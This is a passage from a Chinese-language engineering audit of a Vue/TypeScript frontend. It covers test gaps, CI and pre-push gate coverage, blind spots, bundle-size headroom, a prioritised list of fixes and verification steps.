**"每个 resource 一个文件 + 一个 test" 的 1:1 只成立 17/29**。缺测试的 `api/` 文件 12 个（含 `agent.ts` 145 行——它是全仓唯一带请求超时 `AbortSignal.timeout(10000)` 的地方）、缺测试的 store 3 个（`executor.ts` 68 行、`resources.ts` 141 行、`modelConn.ts` 61 行，都含真动作与状态机）。

### 6.2 零测试的核心模块（按行数）

| 文件 | 行数 | 间接覆盖 | 风险 |
|---|---|---|---|
| `sandbox/iframe-lifecycle.ts` | 497 | ❌ 零测试（`grep` 确认无测试文件引用） | **运行期子系统**：iframe 生命周期、postMessage 分发、监听清理 |
| `composables/useResourceFrames.ts` | 384 | ❌ 本文件逻辑无测试 | **运行期子系统**：抓取代理、nonce 修复、TavernHelper RPC 桥 |
| `components/TaskExecutorsModal.vue` | 309 | ❌ | 弹窗行为（体积门禁只管它的加载方式，不管行为） |
| `components/OptimizeModal.vue` | 264 | ❌ | 同上 |
| `cssSanitize.ts` | 279 | ⚠️ 仅经 `render.ts`/`sandbox/sanitize.ts` 间接 | **安全关键**，7 个导出函数无直接单测 |
| `components/ChatTopbar.vue` | 231 | ❌ | |
| `mvu/mini-jquery.ts` | 227 | ⚠️ 部分经 `mvu/host.ts` | 宿主侧 jQuery 子集 |
| `components/settings/AuthorizationSection.vue` | 217 | ❌ | 授权 UI |
| `components/SkillsModal.vue` | 216 | ❌ | |
| `components/ChatRecords.vue` | 205 | ❌ | |

**结构性特征：弹窗组件是最大盲区。** `TaskExecutorsModal`/`OptimizeModal`/`PluginsModal`/`SkillsModal`/`MacrosModal`/`QuickRepliesModal`/`ChatRecords` 全部零测试——体积门禁守它们的**加载方式**，行为侧无人守。

### 6.3 门禁矩阵（前端相关）

| 门禁 | 脚本 | 阈值/口径 | 在哪些路径上跑 |
|---|---|---|---|
| 跨端契约 | `check-contract.mjs` | 21 组映射字段差集，漂移即 FAIL | `check-all` ✅ / `-Quick` ✅ |
| 架构分层 | `check-arch.mjs` | 规则 A/B/I/J；`store` 零环硬守 | 两者 ✅ |
| 测试计数 | `count-tests.mjs --check` | 5 种句式 + 双文档 + 反规避（未匹配到句式也 FAIL） | 两者 ✅ |
| 类型逃逸 | `check-frontend-lint.mjs` | 5 项 ratchet，超基线即 FAIL | 两者 ✅ |
| ESLint | `npm run lint -w web` | **0 error 硬门禁**（warn 不阻塞，现存 49 条） | 两者 ✅ |
| 类型检查 | `vue-tsc --noEmit` | 0 error；**`include` 含 `*.test.ts`**，测试代码也受类型门禁 | 两者 ✅ |
| 单测 | `vitest run` | 全绿 | 两者 ✅ |
| **体积预算** | `check-bundle.mjs` | 首屏 288,000 gz / 全部 506,000 gz / 逐 chunk / 禁 `modal-` 预载 | **仅完整 `check-all`** ❌ `-Quick` 跳过 |

**"最硬的门禁跑在最少的路径上"**——三处证据：

1. `check-all.ps1:255-261` 的 `if (-not $Quick) { ... }` 同时包住 `vite build` 与 `bundle budget`。
2. `tools/hooks/pre-push:34` 调用的正是 `-Quick`。
3. `.github/workflows/ci.yml:10-11` 自述"本机当前**未配置 git 远端**，本文件在配置远端并推送后自动生效"——即 CI 当前不运行。

`perf-baseline.mjs` 默认关闭，且其阈值只针对 2 个**后端**端点（`characters_list`、`chat_history`），**没有任何前端指标**（无 FCP/LCP/交互延迟）。

### 6.4 盲区清单

| # | 盲区 | 为什么抓不到 |
|---|---|---|
| 1 | **真实覆盖率** | 无覆盖率依赖、无 `coverage` 配置、全仓 grep `coverage` 0 命中、文档 0 提及。三重否定 |
| 2 | **测试有效性（空转测试）** | `count-tests.mjs:50` 的正则只数 `it(`/`test(` 调用次数——`it('x', () => {})` 与 50 行深度断言在门禁眼中等价 |
| 3 | **越界索引访问** | `tsconfig.json` 无 `noUncheckedIndexedAccess`；而 ratchet 的 `nonNull` 只统计**写了** `!.` 的情况 → 不写 `!` 的越界索引既不被 TS 拦也不被 lint 拦 |
| 4 | **代码格式** | `prettier --check` 未接入任何门禁（`check-all.ps1:248-249` 自述原因：现存代码手写紧凑风格，全量格式化差异面约 80%）。旁证：`stores/chat.ts:412` 与 `stores/uiPrefs.ts:152` 存在被挤到同一行的注释/闭合括号，格式门禁若在跑应报错 |
| 5 | **`check-contract` 未登记的类型** | `MAPPINGS` 是白名单式登记，`check-contract.mjs:24` 明确"未登记的条目不做校验"。**`TaskEvent` 的载荷字段就没有守卫**——守卫只比变体名（`:374-388`），`phase`/`step_index` 改名时检查仍全绿、TS 也全绿，前端静默读到 `undefined`，而这两个字段正是 `liveBuffers` 流式缓冲的 key |
| 6 | **`base` 路径变更** | `check-bundle.mjs:146` 的正则硬编码 `href="/assets/([^"]+)"`，`vite.config.ts` 未设 `base`（默认 `/`）。若改成相对 base，正则匹配 0 条 → 首屏集合只剩 entry → **体积数字偏小但仍显示 OK**，且无"预载项为 0"的断言 |
| 7 | **组件间行为** | 组件测试用 SSR 模式（`createSSRApp` + `renderToString`，`settingsSections.test.ts:16-18` 明说）→ **不触发 `onMounted`**、不覆盖 `lazyModal` chunk 加载、不覆盖两级导航交互 |
| 8 | **门禁阶段顺序** | `Invoke-Stage`（`check-all.ps1:78-84`）在任一 stage 失败时 `exit 1` 并**跳过全部后续**；前端 stage 排在审计/文档之后 → 后端 clippy 或 `check-docs` 失败时体积门禁根本不会跑，而汇总表不打印"未执行" |

### 6.5 构建产物余量

| 维度 | 实测 gzip | 预算 | 余量 | 已用 |
|---|---|---|---|---|
| **首屏合计**（entry + 5 项预载） | **275,170** | 288,000 | 12,830 | **95.5%** |
| **全部资产**（55 chunk） | **478,065** | 506,000 | 27,935 | 94.5% |
| `index.js` | 107,914 | 118,600 | 10,686 | 91.0% |
| `flow-vendor.js` | 71,603 | 79,000 | 7,397 | 90.6% |
| `vendor.js` | 70,815 | 78,000 | 7,185 | 90.8% |
| `content-rendering.js` | 44,786 | 49,500 | 4,714 | 90.5% |
| `vue-vendor.js` | 34,069 | 37,500 | 3,431 | 90.9% |
| `index.css` | 17,214 | 18,500 | **1,286** | **93.0%** |
| `AgentFlowSection.js`（走默认 12,000） | **11,649** | 12,000 | **351** | **97.1%** |

**最紧的三个点**：`AgentFlowSection`（余 2.9%）、`index.css`（余 7.0%）、首屏总量（余 4.5%）。

**参照系**：`check-bundle.mjs:53-54` 登记的前例是——2026-09-26 的一次功能批次让 `index.js` gzip 从 97,480 涨到 107,834，**单批 +10,354**。也就是说，**再来一次同等规模的功能新增，首屏预算就被击穿**。而每个已登记 chunk 的余量都在 7.0%~9.5% 这个窄带内，这是设计使然（预算口径就是"实测值 + 10%"），意味着任何一次功能新增都会逼近红线并触发"上调预算"的流程。

`check-bundle.mjs:88-93` 的注释**已经预警过**："AgentFlowSection 距上限只剩约 3%，下次再动它请先跑本脚本"。上游还要注意：这份余量在 `pre-push` 路径上**不被验证**，所以在日常开发流程中它是**不可见的**。

---

## 七、建议的修复顺序

按"改动成本 / 风险降低"排序：

1. **P1-1 四处补守卫**（约 4 行代码，收益最大）——切会话/切角色/切任务显示错数据的用户可见缺陷，且其中一处会导致误删历史。
2. **P1-2 blob URL 生命周期**（一个 `Map` + 一个 `onBeforeUnmount`）——Android 端有 OOM 实感。
3. **P1-3 资源卡加载门槛**（一行条件判断即可堵住，例如 `hydrate` 前置 `renderHtml && currentScriptAuthorized`）——唯一"可用一条消息文本绕过授权"的路径。
4. **P1-4 `resourceStore` 竞态**（把 `loaded.add` 挪到 `await` 之后，或把 `memory.set` 改用"仅当仍是同一对象时写入"）——影响真实资源卡的使用。
5. **`TaskEvent` 载荷字段纳入 `check-contract.mjs`**（补一条映射登记）——把"静默 undefined"变成机器可见。
6. **体积预算接进 `pre-push`**，或至少让 `-Quick` 保留 `vite build` + `bundle budget`——当前"最硬的门禁只在你手动跑完整档时才生效"。
7. **`TaskBoard.vue` 拆分**（1240 行 / 27 computed / 6 种模式分支）——建议按执行模式拆子组件，这是唯一能同时降低认知负荷与 `index.js` 体积的方向。
8. **给弹窗补 ESC + 焦点陷阱 + `role="dialog"`**——16 个弹窗一次性补齐，或先做一个共享的 `useModalA11y` composable。当前键盘用户连退出确认框都关不掉。
9. **覆盖率度量上线**（加 `@vitest/coverage-v8` 并对 `sandbox/`、`cssSanitize.ts`、`stores/` 设一个"不许下降"的 ratchet，与既有 `check-frontend-lint.mjs` 同一体例）——不追求阈值，先让"哪些代码没人跑"变得可见。
10. **`style.css` 的 `!important` 计数进门禁**（把"存量 11 处"从注释变成断言）——与 `modals.test.ts`、ratchet 基线同一思路：**凡是写在注释里的纪律，都在漂移**。

---

## 附录 A：本次调查的方法与局限

- **手段**：`Read`/`Grep`/`Glob` 静态勘察 + 4 路并行子智能体专项审查（各自独立读码，报告在汇总前交叉核对）+ 本机实跑 8 条门禁命令。
- **复核原则**：所有 P1 结论与所有"两通道口径不一致"类结论，均由本人重读源码确认，并保留 `文件:行号`。子智能体提出但本人未复核的结论已标注。
- **局限**：① 未做真实浏览器/桌面壳的人工交互验收，涉及观感与真实 WebView2 行为的判断可能失真；② 未做性能剖析（无 flamegraph、无内存快照），性能类结论均为代码结构推断；③ 子智能体的部分统计（如"162 个零引用符号"）来自脚本扫描，可能含假阳性，正文只采纳了抽样复核过的条目。

## 附录 B：待验证清单

| # | 待验证项 | 验证方法 |
|---|---|---|
| 1 | **WebView2 是否包装 `event.source`** | 这条决定一个潜在 P2 是否成立：沙箱模块 `iframe-lifecycle.ts:361-368` 用 6 行注释断言"WebView2 会把跨源 iframe 的 `event.source` 包装成另一个对象，故不校验 source"，而资源帧 `useResourceFrames.ts:187-188` **恰恰依赖** `ev.source === frame.contentWindow` 做身份。同一平台事实、两种相反假设。若前者成立，则桌面 exe 中资源页的上行消息全被静默丢弃（作者页 `await TavernHelper.generate` 永久悬挂）。**方法**：打包 exe 开吸血鬼卡，查 `localStorage['kedai.tavern-call-log']` 是否含 `phase:'received'`；或临时打印 `ev.source === frame.contentWindow`（浏览器应 true，exe 若 false 即坐实） |
| 2 | 虚拟滚动 `isWithinRowWindow` 的实际开销占比 | 500+ 条消息的会话滚动录 Performance，看该函数是否进火焰图前列；占比 <2% 则降为 P3 |
| 3 | `sanitizeScopedCss` 丢弃 `@media`/`@font-face` 是有意还是遗漏 | `render.test.ts:101-102` 断言"不含 @media/@font-face"，而 `cssSanitize.ts:160` 注释写"@font-face/@import 等原样保留"，两处矛盾。**方法**：找一张依赖 `@media` 的真实卡对照渲染结果 |
| 4 | `error` 终态后 `isActive()` 是否仍为 true | 单测 mock `streamChat` 同步派发 `{type:'error'}`，断言 `isActive() === false` |
| 5 | `resourceStore` 竞态的实际触发频率 | 在 `resourceStore.ts:242` 加临时日志（`memory.has(url)` 与 `loaded.has(url)` 的时序），用真实资源卡在下载中刷新页面复现 |

---

*报告生成时间：2026-09-26；对应工作区状态：`main` 分支，HEAD `d215c69`。*
